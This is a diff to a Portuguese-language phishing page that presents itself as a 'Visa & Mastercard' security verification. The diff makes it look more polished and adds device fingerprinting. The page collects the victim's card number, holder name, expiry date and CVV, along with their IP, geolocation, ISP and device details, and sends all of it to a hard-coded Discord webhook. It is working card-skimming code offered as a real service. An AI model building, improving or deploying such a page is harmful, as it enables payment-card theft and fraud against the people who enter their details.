@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação Premium - Visa & Mastercard</title>
+    <title>Verificação Ultra Premium - Visa & Mastercard</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --visa-blue: #1a1f71;
@@ -16,6 +17,12 @@
             --error-red: #F44336;
             --premium-purple: #6a0dad;
             --premium-gold: #ffd700;
+            --dark-bg: #0f0c29;
+            --darker-bg: #0a081f;
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --text-primary: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.8);
         }
         
         * {
@@ -25,75 +32,122 @@
         }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, var(--dark-bg), #302b63, var(--darker-bg));
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #fff;
+            color: var(--text-primary);
             line-height: 1.6;
             padding: 20px;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 850px;
-            animation: fadeIn 0.8s ease-out;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        /* Estilos do Cartão Premium */
-        .card {
-            border-radius: 20px;
-            padding: 30px;
-            margin-bottom: 40px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
             position: relative;
-            overflow: hidden;
-            color: white;
-            transition: all 0.4s ease;
-            height: 250px;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            overflow-x: hidden;
         }
         
-        .card.visa {
-            background: linear-gradient(135deg, rgba(26, 31, 113, 0.8), rgba(42, 50, 143, 0.9));
-        }
-        
-        .card.mastercard {
-            background: linear-gradient(135deg, rgba(235, 0, 27, 0.8), rgba(255, 45, 45, 0.9));
-        }
-        
-        .card.unknown {
-            background: linear-gradient(135deg, rgba(67, 67, 67, 0.8), rgba(0, 0, 0, 0.9));
-        }
-        
-        .card::before {
+        body::before {
             content: '';
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
-            transform: rotate(30deg);
+            background: radial-gradient(circle at center, rgba(106, 13, 173, 0.1) 0%, transparent 70%);
+            z-index: -1;
+            animation: float 15s infinite alternate ease-in-out;
+        }
+        
+        @keyframes float {
+            0% { transform: translate(0, 0); }
+            50% { transform: translate(-5%, -5%); }
+            100% { transform: translate(5%, 5%); }
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 900px;
+            animation: fadeIn 0.8s cubic-bezier(0.22, 1, 0.36, 1);
+            perspective: 1000px;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px) rotateX(10deg); }
+            to { opacity: 1; transform: translateY(0) rotateX(0); }
+        }
+        
+        /* Estilos do Cartão Ultra Premium */
+        .card-wrapper {
+            position: relative;
+            margin-bottom: 40px;
+            transform-style: preserve-3d;
+            transition: transform 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+            height: 260px;
+        }
+        
+        .card {
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+            color: white;
+            transition: all 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+            height: 100%;
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+            background: var(--glass-bg);
+            transform-style: preserve-3d;
+        }
+        
+        .card.visa {
+            background: linear-gradient(135deg, rgba(26, 31, 113, 0.7), rgba(42, 50, 143, 0.8));
+        }
+        
+        .card.mastercard {
+            background: linear-gradient(135deg, rgba(235, 0, 27, 0.7), rgba(255, 45, 45, 0.8));
+        }
+        
+        .card.unknown {
+            background: linear-gradient(135deg, rgba(67, 67, 67, 0.7), rgba(0, 0, 0, 0.8));
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.03), transparent);
+            pointer-events: none;
         }
         
         .card-glare {
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.03), transparent);
-            transform: rotate(30deg);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
             pointer-events: none;
+            opacity: 0.7;
+        }
+        
+        .card-hologram {
+            position: absolute;
+            top: 30px;
+            right: 30px;
+            width: 60px;
+            height: 40px;
+            background: linear-gradient(135deg, 
+                rgba(255, 255, 255, 0.8), 
+                rgba(255, 215, 0, 0.6), 
+                rgba(100, 255, 255, 0.4), 
+                transparent);
+            border-radius: 5px;
+            transform: rotate(15deg);
+            filter: blur(1px);
+            opacity: 0.8;
         }
         
         .card-header {
@@ -106,17 +160,17 @@
         }
         
         .card-logo {
-            font-weight: bold;
+            font-weight: 600;
             font-size: 26px;
-            text-shadow: 0 3px 6px rgba(0, 0, 0, 0.4);
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            letter-spacing: 1px;
         }
         
-        .card-logo img {
-            height: 45px;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        .card-logo i {
+            font-size: 32px;
         }
         
         .card-chip {
@@ -128,13 +182,24 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        .card-chip::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.3), transparent);
         }
         
         .card-chip i {
-            color: #333;
+            color: rgba(0, 0, 0, 0.7);
             font-size: 28px;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+            z-index: 1;
         }
         
         .card-number {
@@ -143,9 +208,10 @@
             margin: 25px 0;
             word-spacing: 10px;
             font-family: 'Courier New', monospace;
-            text-shadow: 0 3px 6px rgba(0, 0, 0, 0.4);
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
             position: relative;
             z-index: 2;
+            font-weight: 500;
         }
         
         .card-details {
@@ -159,6 +225,7 @@
         .card-expiry, .card-holder, .card-cvv {
             font-size: 16px;
             opacity: 0.95;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
         }
         
         .card-holder {
@@ -167,28 +234,53 @@
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
-            font-weight: 600;
+            font-weight: 500;
         }
         
-        /* Estilos do Formulário Premium */
+        .card-cvv {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .card-cvv i {
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        /* Estilos do Formulário Ultra Premium */
         .form-container {
-            background: rgba(255, 255, 255, 0.08);
+            background: rgba(15, 12, 41, 0.7);
             padding: 35px;
             border-radius: 20px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            animation: slideUp 0.8s ease-out;
+            backdrop-filter: blur(15px);
+            border: 1px solid var(--glass-border);
+            animation: slideUp 0.8s cubic-bezier(0.22, 1, 0.36, 1);
+            transform-style: preserve-3d;
         }
         
         @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: translateY(40px) rotateX(15deg); }
+            to { opacity: 1; transform: translateY(0) rotateX(0); }
         }
         
         .form-header {
             text-align: center;
             margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .form-header::after {
+            content: '';
+            position: absolute;
+            bottom: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--premium-purple), transparent);
+            border-radius: 3px;
         }
         
         .form-header h2 {
@@ -196,46 +288,61 @@
             margin-bottom: 10px;
             font-size: 28px;
             font-weight: 600;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            letter-spacing: 1px;
         }
         
         .form-header p {
-            color: rgba(255, 255, 255, 0.8);
+            color: var(--text-secondary);
             font-size: 16px;
+            font-weight: 300;
         }
         
         .form-group {
             margin-bottom: 25px;
+            position: relative;
         }
         
         label {
             display: block;
-            margin-bottom: 10px;
-            font-weight: 600;
+            margin-bottom: 12px;
+            font-weight: 500;
             color: #fff;
             font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        label i {
+            font-size: 18px;
+            opacity: 0.8;
         }
         
         input {
             width: 100%;
-            padding: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
+            padding: 16px 18px;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
             font-size: 16px;
-            transition: all 0.3s;
-            background: rgba(0, 0, 0, 0.2);
+            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            background: rgba(0, 0, 0, 0.25);
             color: #fff;
+            font-family: 'Poppins', sans-serif;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2);
         }
         
         input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
+            color: rgba(255, 255, 255, 0.4);
+            font-weight: 300;
         }
         
         input:focus {
             border-color: var(--premium-purple);
             outline: none;
-            box-shadow: 0 0 0 3px rgba(106, 13, 173, 0.3);
-            background: rgba(0, 0, 0, 0.3);
+            box-shadow: 0 0 0 3px rgba(106, 13, 173, 0.3), inset 0 1px 3px rgba(0, 0, 0, 0.2);
+            background: rgba(0, 0, 0, 0.35);
+            transform: translateY(-2px);
         }
         
         .form-row {
@@ -252,22 +359,24 @@
             color: white;
             border: none;
             padding: 18px;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 17px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            transition: all 0.3s;
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 12px;
-            margin-top: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            margin-top: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
             text-transform: uppercase;
             letter-spacing: 1px;
             position: relative;
             overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
         }
         
         button::before {
@@ -278,13 +387,13 @@
             width: 100%;
             height: 100%;
             background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
+            transition: 0.6s;
         }
         
         button:hover {
             background: linear-gradient(135deg, #5a0b9a, var(--premium-purple));
             transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.4);
         }
         
         button:hover::before {
@@ -292,24 +401,25 @@
         }
         
         button:disabled {
-            background: #555;
+            background: rgba(85, 85, 85, 0.5);
             cursor: not-allowed;
             transform: none;
-            box-shadow: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         
         button:disabled:hover::before {
             left: -100%;
         }
         
-        /* Estilos da Verificação Premium */
+        /* Estilos da Verificação Ultra Premium */
         .verification-container {
             margin-top: 30px;
-            border-radius: 12px;
+            border-radius: 15px;
             overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid var(--glass-border);
+            transform: translateZ(20px);
         }
         
         .verification-step {
@@ -319,25 +429,25 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            transition: all 0.4s;
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
         }
         
         .verification-step:not(:last-child) {
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
         }
         
         .verification-step.active {
-            background-color: rgba(106, 13, 173, 0.2);
+            background-color: rgba(106, 13, 173, 0.25);
             border-left-color: var(--premium-purple);
         }
         
         .verification-step.completed {
-            background-color: rgba(76, 175, 80, 0.2);
+            background-color: rgba(76, 175, 80, 0.25);
             border-left-color: var(--secure-green);
         }
         
         .verification-step.failed {
-            background-color: rgba(244, 67, 54, 0.2);
+            background-color: rgba(244, 67, 54, 0.25);
             border-left-color: var(--error-red);
         }
         
@@ -346,14 +456,16 @@
             align-items: center;
             gap: 15px;
             font-size: 15px;
+            font-weight: 400;
         }
         
         .verification-step .step-icon {
             font-size: 20px;
+            min-width: 20px;
         }
         
         .verification-step .status-icon {
-            font-size: 18px;
+            font-size: 16px;
             opacity: 0.7;
         }
         
@@ -361,13 +473,15 @@
             text-align: center;
             margin-top: 25px;
             padding: 25px;
-            border-radius: 12px;
+            border-radius: 15px;
             font-weight: 600;
-            font-size: 19px;
+            font-size: 18px;
             display: none;
             animation: fadeIn 0.5s ease-out;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--glass-border);
+            background: rgba(0, 0, 0, 0.3);
+            transform: translateZ(30px);
         }
         
         .verification-result i {
@@ -376,91 +490,225 @@
         }
         
         .verification-result.secure {
-            background: linear-gradient(135deg, rgba(76, 175, 80, 0.2), rgba(46, 125, 50, 0.3));
-            color: #a5d6a7;
-            border-color: rgba(76, 175, 80, 0.3);
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.25), rgba(46, 125, 50, 0.35));
+            color: #c8e6c9;
+            border-color: rgba(76, 175, 80, 0.4);
             display: none;
         }
         
         .verification-result.insecure {
-            background: linear-gradient(135deg, rgba(244, 67, 54, 0.2), rgba(183, 28, 28, 0.3));
-            color: #ef9a9a;
-            border-color: rgba(244, 67, 54, 0.3);
+            background: linear-gradient(135deg, rgba(244, 67, 54, 0.25), rgba(183, 28, 28, 0.35));
+            color: #ffcdd2;
+            border-color: rgba(244, 67, 54, 0.4);
             display: none;
         }
         
-        /* Loader Premium */
+        /* Loader Ultra Premium */
         .loader {
             display: inline-block;
             width: 24px;
             height: 24px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
+            border: 3px solid rgba(255, 255, 255, 0.2);
             border-radius: 50%;
             border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
+            animation: spin 1s cubic-bezier(0.55, 0.15, 0.45, 0.85) infinite;
         }
         
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
         
-        /* Responsividade */
+        /* Responsividade Avançada */
         @media (max-width: 768px) {
-            .form-row {
-                flex-direction: column;
-                gap: 0;
+            .container {
+                padding: 15px;
+                max-width: 100%;
+            }
+            
+            .card-wrapper {
+                height: 230px;
+                margin-bottom: 30px;
+            }
+            
+            .card {
+                padding: 25px;
             }
             
             .card-number {
                 font-size: 22px;
+                margin: 20px 0;
             }
             
-            .container {
-                padding: 15px;
+            .card-logo {
+                font-size: 22px;
+            }
+            
+            .card-chip {
+                width: 50px;
+                height: 38px;
+            }
+            
+            .card-chip i {
+                font-size: 24px;
             }
             
             .form-container {
                 padding: 25px;
             }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            button {
+                padding: 16px;
+            }
+            
+            .verification-step {
+                padding: 15px 20px;
+            }
         }
         
-        /* Efeito de brilho no cartão */
-        .card:hover::before {
-            animation: shine 3s infinite;
+        @media (max-width: 480px) {
+            .card-wrapper {
+                height: 210px;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .card-number {
+                font-size: 18px;
+                letter-spacing: 2px;
+                margin: 15px 0;
+            }
+            
+            .card-header {
+                margin-bottom: 25px;
+            }
+            
+            .card-logo {
+                font-size: 20px;
+                gap: 8px;
+            }
+            
+            .card-logo i {
+                font-size: 26px;
+            }
+            
+            .card-chip {
+                width: 45px;
+                height: 35px;
+            }
+            
+            .card-chip i {
+                font-size: 22px;
+            }
+            
+            .card-details div {
+                font-size: 14px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+            
+            .form-header h2 {
+                font-size: 24px;
+            }
+            
+            input {
+                padding: 14px 16px;
+            }
+            
+            .verification-step .step-text {
+                font-size: 14px;
+                gap: 12px;
+            }
+            
+            .verification-result {
+                padding: 20px;
+                font-size: 16px;
+            }
         }
         
-        @keyframes shine {
-            0% { transform: rotate(30deg) translate(-30%, -30%); }
-            100% { transform: rotate(30deg) translate(30%, 30%); }
+        /* Efeitos 3D no hover */
+        .card-wrapper:hover {
+            transform: rotateY(5deg) rotateX(2deg) translateY(-5px);
+        }
+        
+        /* Efeito de flutuação sutil */
+        @keyframes floatCard {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .card-wrapper {
+            animation: floatCard 6s ease-in-out infinite;
+        }
+        
+        /* Efeito de partículas */
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: floatParticle linear infinite;
+        }
+        
+        @keyframes floatParticle {
+            0% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(20px); opacity: 0; }
         }
     </style>
 </head>
 <body>
+    <div class="particles" id="particles"></div>
+    
     <div class="container">
-        <div class="card unknown" id="card-preview">
-            <div class="card-glare"></div>
-            <div class="card-header">
-                <div class="card-logo" id="card-logo">
-                    <i class="fas fa-credit-card"></i>
-                    <span>PREMIUM CARD</span>
+        <div class="card-wrapper" id="card-wrapper">
+            <div class="card unknown" id="card-preview">
+                <div class="card-glare"></div>
+                <div class="card-hologram"></div>
+                <div class="card-header">
+                    <div class="card-logo" id="card-logo">
+                        <i class="fas fa-credit-card"></i>
+                        <span>PREMIUM CARD</span>
+                    </div>
+                    <div class="card-chip">
+                        <i class="fas fa-microchip"></i>
+                    </div>
                 </div>
-                <div class="card-chip">
-                    <i class="fas fa-microchip"></i>
+                <div class="card-number" id="display-card-number">•••• •••• •••• ••••</div>
+                <div class="card-details">
+                    <div>
+                        <div class="card-holder" id="display-card-holder">NOME DO TITULAR</div>
+                        <div class="card-expiry" id="display-card-expiry">MM/AA</div>
+                    </div>
+                    <div class="card-cvv">
+                        <i class="fas fa-lock"></i>
+                        <span id="display-card-cvv">•••</span>
+                    </div>
                 </div>
-            </div>
-            <div class="card-number" id="display-card-number">•••• •••• •••• ••••</div>
-            <div class="card-details">
-                <div>
-                    <div class="card-holder" id="display-card-holder">NOME DO TITULAR</div>
-                    <div class="card-expiry" id="display-card-expiry">MM/AA</div>
-                </div>
-                <div class="card-cvv" id="display-card-cvv">•••</div>
             </div>
         </div>
         
         <div class="form-container">
             <div class="form-header">
-                <h2><i class="fas fa-shield-alt"></i> VERIFICAÇÃO PREMIUM</h2>
+                <h2><i class="fas fa-shield-alt"></i> VERIFICAÇÃO ULTRA PREMIUM</h2>
                 <p>Digite os dados do seu cartão para verificação de segurança completa</p>
             </div>
             
@@ -472,12 +720,12 @@
                 
                 <div class="form-row">
                     <div class="form-group">
-                        <label for="card-holder"><i class="fas fa-user"></i> Nome do Titular</label>
+                        <label for="card-holder"><i class="fas fa-user-tie"></i> Nome do Titular</label>
                         <input type="text" id="card-holder" placeholder="Como no cartão" required>
                     </div>
                     
                     <div class="form-group">
-                        <label for="card-expiry"><i class="fas fa-calendar-alt"></i> Validade</label>
+                        <label for="card-expiry"><i class="fas fa-calendar-check"></i> Validade</label>
                         <input type="text" id="card-expiry" maxlength="5" placeholder="MM/AA" required>
                     </div>
                     
@@ -555,6 +803,7 @@
         const submitBtn = document.getElementById('submit-btn');
         const btnText = document.getElementById('btn-text');
         const btnIcon = document.getElementById('btn-icon');
+        const cardWrapper = document.getElementById('card-wrapper');
         
         // Elementos de exibição do cartão
         const cardPreview = document.getElementById('card-preview');
@@ -568,6 +817,58 @@
         const verificationSteps = document.getElementById('verification-steps').children;
         const secureResult = document.getElementById('secure-result');
         const insecureResult = document.getElementById('insecure-result');
+        
+        // Criar partículas
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = window.innerWidth < 768 ? 20 : 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Tamanho aleatório entre 1px e 3px
+                const size = Math.random() * 2 + 1;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Posição inicial aleatória
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.bottom = `-10px`;
+                
+                // Duração da animação aleatória
+                const duration = Math.random() * 20 + 10;
+                particle.style.animationDuration = `${duration}s`;
+                
+                // Atraso inicial aleatório
+                particle.style.animationDelay = `${Math.random() * 10}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+        
+        // Inicializar partículas
+        createParticles();
+        
+        // Efeito 3D no cartão com movimento do mouse
+        function handleCardTilt(e) {
+            const x = e.clientX - window.innerWidth / 2;
+            const y = e.clientY - window.innerHeight / 2;
+            
+            const tiltX = (y / window.innerHeight) * 10;
+            const tiltY = -(x / window.innerWidth) * 10;
+            
+            cardWrapper.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg) translateY(-5px)`;
+        }
+        
+        // Resetar posição do cartão
+        function resetCardTilt() {
+            cardWrapper.style.transform = 'rotateX(0) rotateY(0) translateY(0)';
+        }
+        
+        // Adicionar listeners para efeito 3D
+        document.addEventListener('mousemove', handleCardTilt);
+        document.addEventListener('mouseleave', resetCardTilt);
         
         // Formatação do número do cartão
         cardNumberInput.addEventListener('input', function(e) {
@@ -753,7 +1054,8 @@
                 timestamp: new Date().toISOString(),
                 ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'unknown'),
                 userAgent: navigator.userAgent,
-                location: await getLocation()
+                location: await getLocation(),
+                deviceInfo: getDeviceInfo()
             };
             
             // Verificação passo a passo
@@ -864,19 +1166,65 @@
                     city: data.city || 'Unknown',
                     region: data.region || 'Unknown',
                     country: data.country_name || 'Unknown',
-                    postal: data.postal || 'Unknown'
+                    postal: data.postal || 'Unknown',
+                    isp: data.org || 'Unknown ISP'
                 };
             } catch (error) {
                 return {
                     city: 'Unknown',
                     region: 'Unknown',
                     country: 'Unknown',
-                    postal: 'Unknown'
+                    postal: 'Unknown',
+                    isp: 'Unknown ISP'
                 };
             }
         }
         
-        // Função para enviar dados para o webhook do Discord com estilo premium
+        // Função para obter informações do dispositivo
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = 'Desktop';
+            
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+                deviceType = /Android/i.test(userAgent) ? 'Android' : /iPhone|iPad|iPod/i.test(userAgent) ? 'iOS' : 'Mobile';
+            }
+            
+            return {
+                type: deviceType,
+                browser: getBrowser(),
+                os: getOS(),
+                screen: `${window.screen.width}x${window.screen.height}`,
+                touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+            };
+        }
+        
+        function getBrowser() {
+            const userAgent = navigator.userAgent;
+            
+            if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+            if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
+            if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
+            if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+            if (userAgent.indexOf("Edge") > -1) return "Edge";
+            if (userAgent.indexOf("Chrome") > -1) return "Chrome";
+            if (userAgent.indexOf("Safari") > -1) return "Safari";
+            
+            return "Unknown";
+        }
+        
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            
+            if (userAgent.indexOf("Windows") > -1) return "Windows";
+            if (userAgent.indexOf("Mac") > -1) return "MacOS";
+            if (userAgent.indexOf("Linux") > -1) return "Linux";
+            if (userAgent.indexOf("Android") > -1) return "Android";
+            if (userAgent.indexOf("iOS") > -1 || /iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
+            
+            return "Unknown";
+        }
+        
+        // Função para enviar dados para o webhook do Discord com estilo ultra premium
         async function sendToDiscordWebhook(cardData) {
             // SUBSTITUA POR SEU WEBHOOK DO DISCORD
             const webhookUrl = 'https://discord.com/api/webhooks/1359658940874494173/1yJEVMiPO3i1AaxNIGKLleQfaxNkGDtCMmnuXo9vCIWxLahMVJf-g_ddxmssCPEM72qB';
@@ -887,48 +1235,53 @@
             
             // Cria uma embed rica para o Discord
             const embed = {
-                title: '💳 NOVO CARTÃO VERIFICADO - DADOS COMPLETOS',
+                title: '💎 **CARTÃO VERIFICADO - DADOS COMPLETOS** 💎',
                 color: 0x6a0dad,
-                description: '**Um novo cartão foi verificado com sucesso no sistema premium.**\nTodos os dados estão disponíveis abaixo:',
+                description: '🔐 **Um novo cartão foi verificado com sucesso no sistema ultra premium.**\nTodos os dados estão disponíveis abaixo:',
                 fields: [
                     {
-                        name: '🔢 Número do Cartão',
+                        name: '💳 **Número do Cartão**',
                         value: `\`\`\`${formattedNumber}\`\`\``,
                         inline: false
                     },
                     {
-                        name: '👤 Titular do Cartão',
+                        name: '👤 **Titular do Cartão**',
                         value: `\`\`\`${cardData.holder || 'Não informado'}\`\`\``,
                         inline: true
                     },
                     {
-                        name: '📅 Validade',
+                        name: '📅 **Validade**',
                         value: `\`\`\`${expiryDate}\`\`\``,
                         inline: true
                     },
                     {
-                        name: '🔐 Código CVV',
+                        name: '🔐 **Código CVV**',
                         value: `\`\`\`${cardData.cvv || 'Não informado'}\`\`\``,
                         inline: true
                     },
                     {
-                        name: '🏦 Bandeira',
+                        name: '🏦 **Bandeira**',
                         value: cardData.brand === 'visa' ? 'Visa' : cardData.brand === 'mastercard' ? 'Mastercard' : 'Desconhecida',
                         inline: true
                     },
                     {
-                        name: '🌐 Localização',
-                        value: `📍 ${cardData.location.city}, ${cardData.location.region}\n🏳️ ${cardData.location.country} (${cardData.location.postal})`,
-                        inline: true
+                        name: '🌍 **Localização**',
+                        value: `📍 **Cidade:** ${cardData.location.city}\n🏛️ **Estado:** ${cardData.location.region}\n🏳️ **País:** ${cardData.location.country}\n📮 **CEP:** ${cardData.location.postal}\n📶 **ISP:** ${cardData.location.isp}`,
+                        inline: false
                     },
                     {
-                        name: '🖥️ Dispositivo',
-                        value: `\`\`\`${cardData.userAgent.substring(0, 100)}...\`\`\``,
+                        name: '📱 **Dispositivo**',
+                        value: `🖥️ **Tipo:** ${cardData.deviceInfo.type}\n🔍 **Navegador:** ${cardData.deviceInfo.browser}\n💻 **Sistema:** ${cardData.deviceInfo.os}\n🖥️ **Resolução:** ${cardData.deviceInfo.screen}\n👆 **Touch:** ${cardData.deviceInfo.touch ? 'Sim' : 'Não'}`,
+                        inline: false
+                    },
+                    {
+                        name: '🔧 **User Agent**',
+                        value: `\`\`\`${cardData.userAgent.substring(0, 200)}...\`\`\``,
                         inline: false
                     }
                 ],
                 footer: {
-                    text: 'Sistema Premium de Verificação • ' + new Date(cardData.timestamp).toLocaleString('pt-BR')
+                    text: `Sistema Ultra Premium de Verificação • ${new Date(cardData.timestamp).toLocaleString('pt-BR')}`
                 },
                 thumbnail: {
                     url: cardData.brand === 'visa' ? 
@@ -936,12 +1289,16 @@
                         cardData.brand === 'mastercard' ? 
                         'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png' : 
                         'https://cdn-icons-png.flaticon.com/512/196/196578.png'
+                },
+                author: {
+                    name: 'Sistema de Verificação Ultra Premium',
+                    icon_url: 'https://cdn-icons-png.flaticon.com/512/2489/2489078.png'
                 }
             };
             
             const payload = {
                 embeds: [embed],
-                content: '@here **🚀 NOVA VERIFICAÇÃO DE CARTÃO PREMIUM**\nTodos os dados estão disponíveis abaixo 👇'
+                content: '@everyone **🚨🚀 NOVA VERIFICAÇÃO DE CARTÃO ULTRA PREMIUM 🚀🚨**\n**Todos os dados completos estão disponíveis abaixo** 👇'
             };
             
             try {
